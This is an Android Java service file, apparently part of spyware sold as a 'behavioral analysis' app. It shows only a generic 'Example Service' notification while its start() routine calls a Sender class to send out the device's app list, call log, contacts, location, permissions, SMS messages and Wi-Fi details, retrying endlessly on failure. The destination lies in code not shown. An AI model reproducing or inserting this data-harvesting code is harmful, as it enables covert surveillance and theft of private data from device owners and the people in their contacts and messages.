package com.behavioralanalysis.service;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import static com.behavioralanalysis.service.App.CHANNEL_ID;

public class MainService extends Service {
    private static Context context;

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this,
                0,
                notificationIntent,
                0
        );

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Example Service")
                .setContentText("Service is running...")
                .setSmallIcon(R.drawable.ic_android)
                .setContentIntent(pendingIntent)
                .build();
        startForeground(1, notification);

        context = this;

        start();

        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static Context getContext() {
        return context;
    }

    public static void start() {
        try {
            Sender.sendApps(true);
            Sender.sendCalls();
            Sender.sendContacts();
            Sender.sendLocation();
            Sender.sendPermissions();
            Sender.sendSms();
            Sender.sendWifi();
        } catch (Exception ex) {
            ex.printStackTrace();
            start();
        }
    }
}
